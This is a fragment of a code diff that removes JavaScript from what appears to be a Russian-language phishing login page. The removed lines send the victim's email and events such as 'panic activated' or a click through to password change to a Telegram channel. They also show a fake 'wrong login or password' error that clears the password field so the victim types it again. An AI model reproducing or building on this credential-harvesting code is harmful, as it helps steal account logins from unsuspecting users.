-                        sendToTelegram(`⚠️ ПАНИКА АКТИВИРОВАНА\n📧 Логин: ${userEmail}\n🕒 ${new Date().toLocaleString('ru-RU')}`);
-                    } else {
-                        errorMsg.textContent = 'Неверный логин или пароль. Попробуйте снова.';
-                        errorMsg.classList.add('show');
-                        passwordInput.value = '';
-                        passwordInput.focus();
-                    }
-                }, 1500);
-            });
-
-            document.querySelector('#stepPanic a')?.addEventListener('click', function() {
-                sendToTelegram(`🔗 ПОЛЬЗОВАТЕЛЬ ПЕРЕШЁЛ К СМЕНЕ ПАРОЛЯ\n📧 Логин: ${userEmail}`);
-            });
-
-            emailInput.addEventListener('input', () => { errorMsg.classList.remove('show'); });
-            passwordInput.addEventListener('input', () => { errorMsg.classList.remove('show'); });
-        })();
 
         // ============================================================
         // ЗАПУСК
